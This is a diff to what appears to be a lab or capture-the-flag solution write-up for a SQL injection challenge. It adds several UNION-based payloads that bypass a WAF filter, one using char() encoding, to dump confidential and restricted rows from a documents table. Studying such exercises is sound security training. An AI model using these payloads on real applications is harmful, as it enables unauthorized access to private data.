@@ -24,9 +24,21 @@ The backend implements a WAF blocking wildcards (`*`), comments (`--`, `#`), and
   ```sql
   %' UNION SELECT title, access_level, file_path, author FROM documents UNION SELECT '1','2','3','4
   ```
-* **Method 2 (Filtered Decoy Dump)**:
+* **Method 2 (Filtered Non-Public Dump via `!=`)**:
   ```sql
   %' UNION SELECT title, access_level, file_path, author FROM documents WHERE access_level!='Public' UNION SELECT '1','2','3','4
+  ```
+* **Method 3 (Empty String Balancing)**:
+  ```sql
+  %' UNION SELECT title, access_level, file_path, author FROM documents UNION SELECT '','','','
+  ```
+* **Method 4 (Targeted Document ID Dump via `LIKE`)**:
+  ```sql
+  %' UNION SELECT title, access_level, file_path, author FROM documents WHERE file_path LIKE '%5%' UNION SELECT '1','2','3','4
+  ```
+* **Method 5 (WAF Char Encoding Bypass)**:
+  ```sql
+  %' UNION SELECT title, access_level, char(47,100,111,119,110,108,111,97,100,47,53), author FROM documents UNION SELECT '1','2','3','4
   ```
 
 Submitting either payload reveals all **7 documents** (Public, Confidential, and Restricted). Notice that multiple documents contain subtle traps!
